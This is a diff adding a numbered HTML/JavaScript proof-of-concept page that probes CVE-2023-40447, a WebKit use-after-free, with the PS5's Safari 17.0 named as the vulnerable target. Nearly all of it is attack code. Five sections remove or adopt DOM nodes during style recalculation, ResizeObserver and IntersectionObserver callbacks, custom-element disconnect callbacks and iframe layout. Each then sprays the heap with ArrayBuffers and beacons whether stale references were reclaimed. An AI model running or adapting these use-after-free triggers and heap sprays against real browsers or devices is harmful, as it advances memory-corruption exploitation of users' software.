@@ -1,0 +1,348 @@
+<!--
+  p692: CVE-2023-40447 -- WebKit UAF (Junsung Lee / Cross Republic)
+
+  CVE-2023-40447: Use-after-free in WebKit, fixed Safari 17.1. Found by Junsung Lee
+  of Cross Republic -- the SAME researcher who found CVE-2023-41976. This suggests
+  similar vulnerability patterns. CWE-119 (memory buffer errors). WebKit Bug 259836.
+
+  PS5 has Safari 17.0 (605.1.15) -- VULNERABLE.
+
+  Since Junsung Lee also found CVE-2023-41976 (DOM UAF), and this CVE is also
+  UAF + memory buffer errors, the likely target is DOM tree manipulation during
+  layout/style recalc, or node lifecycle during event dispatch. We test patterns
+  that combine DOM mutation with layout-triggering operations.
+
+  Patterns tested:
+  A) Node removal during style recalculation (getComputedStyle forces recalc)
+  B) DOM mutation inside ResizeObserver callback
+  C) IntersectionObserver callback with removed target
+  D) Custom element lifecycle callbacks during DOM mutation
+  E) adoptNode during layout (moves node between documents mid-style)
+
+  CRASH_CLASS: MODERATE (UAF through stale DOM/layout reference)
+  prior art: p684 (DOM mutation UAF), p685 (Range/Selection UAF)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p692</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P692-START:CVE-2023-40447-JUNSUNG-UAF');
+  var results = [];
+
+  // === SECTION A: Node removal during forced style recalc ===
+  b('A:STYLE-RECALC-REMOVE');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:relative;width:300px;height:300px;';
+    document.body.appendChild(container);
+
+    // Build a tree with computed style dependencies
+    var nodes = [];
+    for (var i = 0; i < 64; i++) {
+      var el = document.createElement('div');
+      el.className = 'styled-' + i;
+      el.style.cssText = 'width:calc(100% - ' + i + 'px);height:20px;background:red;';
+      el.textContent = 'node-' + i;
+      container.appendChild(el);
+      nodes.push(el);
+    }
+
+    // Add a style that creates dependencies
+    var style = document.createElement('style');
+    style.textContent = '.styled-0:hover ~ div { color: blue; }';
+    document.head.appendChild(style);
+
+    // Force initial layout
+    container.getBoundingClientRect();
+
+    // Now: remove nodes while forcing style recalc on siblings
+    for (var i = 0; i < 32; i++) {
+      container.removeChild(nodes[i * 2]); // remove even nodes
+      // Force recalc on odd nodes (which reference removed siblings via ~)
+      if (nodes[i * 2 + 1] && nodes[i * 2 + 1].parentNode) {
+        getComputedStyle(nodes[i * 2 + 1]).color;
+      }
+    }
+    b('A:REMOVED-32-RECALCED');
+
+    // GC + spray
+    nodes = null;
+    for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+    var spray = [];
+    for (var i = 0; i < 2048; i++) spray.push(new ArrayBuffer(48));
+
+    // Force layout on the now-mutated container
+    try {
+      container.getBoundingClientRect();
+      b('A:LAYOUT-OK');
+    } catch(e2) {
+      b('A:LAYOUT-ERR:' + e2.message);
+      results.push('A:err');
+    }
+
+    container.remove();
+    style.remove();
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: ResizeObserver callback mutation ===
+  b('B:RESIZE-OBSERVER');
+  try {
+    var box = document.createElement('div');
+    box.style.cssText = 'width:100px;height:100px;overflow:hidden;';
+    document.body.appendChild(box);
+
+    var inner = document.createElement('div');
+    inner.style.cssText = 'width:200px;height:200px;background:green;';
+    inner.textContent = 'inner content';
+    box.appendChild(inner);
+
+    var innerRef = inner;
+    var observed = false;
+
+    if (typeof ResizeObserver !== 'undefined') {
+      var ro = new ResizeObserver(function(entries) {
+        if (!observed) {
+          observed = true;
+          // Remove the observed element during callback
+          if (innerRef.parentNode) {
+            innerRef.parentNode.removeChild(innerRef);
+            b('B:REMOVED-IN-CALLBACK');
+          }
+
+          // GC + spray
+          for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+          var spray2 = [];
+          for (var i = 0; i < 1024; i++) spray2.push(new ArrayBuffer(48));
+        }
+      });
+      ro.observe(inner);
+
+      // Trigger resize
+      box.style.width = '200px';
+      box.style.height = '200px';
+
+      setTimeout(function() {
+        // Check if innerRef is stale
+        try {
+          if (innerRef.parentNode === null) {
+            var text = innerRef.textContent;
+            b('B:DETACHED-TEXT:' + text);
+            if (text !== 'inner content') {
+              b('B:RECLAIMED');
+              results.push('B:reclaimed');
+            }
+          }
+        } catch(e2) {
+          b('B:ACCESS-ERR:' + e2.message);
+          results.push('B:err');
+        }
+        ro.disconnect();
+        box.remove();
+        runSectionC();
+      }, 200);
+    } else {
+      b('B:NO-RESIZEOBSERVER');
+      box.remove();
+      runSectionC();
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+    runSectionC();
+  }
+
+  function runSectionC() {
+    // === SECTION C: IntersectionObserver with removed target ===
+    b('C:INTERSECTION-OBSERVER');
+    try {
+      if (typeof IntersectionObserver !== 'undefined') {
+        var target = document.createElement('div');
+        target.style.cssText = 'width:50px;height:50px;background:blue;';
+        target.textContent = 'intersect-target';
+        document.body.appendChild(target);
+
+        var targetRef = target;
+        var ioFired = false;
+
+        var io = new IntersectionObserver(function(entries) {
+          if (!ioFired) {
+            ioFired = true;
+            b('C:IO-CALLBACK:entries=' + entries.length);
+
+            // Remove target during callback
+            if (targetRef.parentNode) {
+              targetRef.remove();
+              b('C:REMOVED-IN-IO');
+            }
+
+            // GC + spray
+            for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+            var spray3 = [];
+            for (var i = 0; i < 1024; i++) spray3.push(new ArrayBuffer(32));
+          }
+        });
+        io.observe(target);
+
+        setTimeout(function() {
+          try {
+            if (targetRef.parentNode === null) {
+              var t = targetRef.textContent;
+              b('C:DETACHED:text=' + t);
+            }
+          } catch(e2) {
+            b('C:ERR2:' + e2.message);
+            results.push('C:err');
+          }
+          io.disconnect();
+          runSectionD();
+        }, 300);
+      } else {
+        b('C:NO-INTERSECTIONOBSERVER');
+        runSectionD();
+      }
+    } catch(e) {
+      b('C:ERR:' + e.message);
+      runSectionD();
+    }
+  }
+
+  function runSectionD() {
+    // === SECTION D: Custom element lifecycle callbacks ===
+    b('D:CUSTOM-ELEMENT');
+    try {
+      if (typeof customElements !== 'undefined') {
+        var disconnectCalls = 0;
+        var staleRefs = [];
+
+        customElements.define('test-elem-d', class extends HTMLElement {
+          connectedCallback() {
+            this.innerHTML = '<span>child-' + (Math.random()*1000|0) + '</span>';
+          }
+          disconnectedCallback() {
+            disconnectCalls++;
+            // Save reference to child that was in the shadow
+            if (this.firstChild) {
+              staleRefs.push(this.firstChild);
+            }
+            // Mutate DOM during disconnect
+            var sibling = this.nextElementSibling;
+            if (sibling && sibling.parentNode) {
+              sibling.remove();
+            }
+          }
+        });
+
+        var host = document.createElement('div');
+        document.body.appendChild(host);
+
+        // Add many custom elements
+        for (var i = 0; i < 32; i++) {
+          var ce = document.createElement('test-elem-d');
+          ce.setAttribute('data-idx', i);
+          host.appendChild(ce);
+        }
+        host.getBoundingClientRect();
+        b('D:CUSTOM-ELEMENTS-CREATED:' + host.children.length);
+
+        // Remove all at once (triggers disconnectedCallback cascade)
+        host.innerHTML = '';
+        b('D:ALL-REMOVED:disconnects=' + disconnectCalls);
+
+        // GC + spray
+        for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
+        var spray4 = [];
+        for (var i = 0; i < 2048; i++) spray4.push(new ArrayBuffer(32));
+
+        // Check stale refs
+        for (var i = 0; i < staleRefs.length; i++) {
+          try {
+            var text = staleRefs[i].textContent;
+            if (text && !text.startsWith('child-')) {
+              b('D:STALE-REF-' + i + ':' + text.substring(0, 20));
+              results.push('D:stale');
+            }
+          } catch(e2) {
+            b('D:REF-ERR-' + i + ':' + e2.message);
+            results.push('D:err');
+          }
+        }
+        host.remove();
+      } else {
+        b('D:NO-CUSTOM-ELEMENTS');
+      }
+      runSectionE();
+    } catch(e) {
+      b('D:ERR:' + e.message);
+      runSectionE();
+    }
+  }
+
+  function runSectionE() {
+    // === SECTION E: adoptNode during layout ===
+    b('E:ADOPT-NODE');
+    try {
+      var iframe = document.createElement('iframe');
+      iframe.srcdoc = '<div id="adopt-target" style="width:100px;height:100px;background:yellow;">adopt me</div>';
+      document.body.appendChild(iframe);
+
+      setTimeout(function() {
+        try {
+          var iDoc = iframe.contentDocument;
+          var target = iDoc.getElementById('adopt-target');
+
+          if (target) {
+            // Force layout in iframe
+            target.getBoundingClientRect();
+
+            // Adopt node into main document mid-layout
+            var adopted = document.adoptNode(target);
+            b('E:ADOPTED:tag=' + adopted.tagName);
+
+            // Force layout in main document immediately
+            document.body.appendChild(adopted);
+            adopted.getBoundingClientRect();
+
+            // GC + spray
+            for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+
+            // Force layout in iframe (target is gone)
+            try {
+              iDoc.body.getBoundingClientRect();
+              b('E:IFRAME-LAYOUT-OK');
+            } catch(e2) {
+              b('E:IFRAME-LAYOUT-ERR:' + e2.message);
+              results.push('E:err');
+            }
+
+            adopted.remove();
+          } else {
+            b('E:NO-TARGET');
+          }
+        } catch(e2) {
+          b('E:ADOPT-ERR:' + e2.message);
+        }
+
+        iframe.remove();
+        finish();
+      }, 300);
+    } catch(e) {
+      b('E:ERR:' + e.message);
+      finish();
+    }
+  }
+
+  function finish() {
+    if (results.length > 0) {
+      b('P692-RESULT:HITS=' + results.join(';'));
+    } else {
+      b('P692-RESULT:NO-UAF-DETECTED');
+    }
+    b('P692-DONE');
+  }
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p692: CVE-2023-40447 WebKit UAF (Junsung Lee)</pre></body></html>
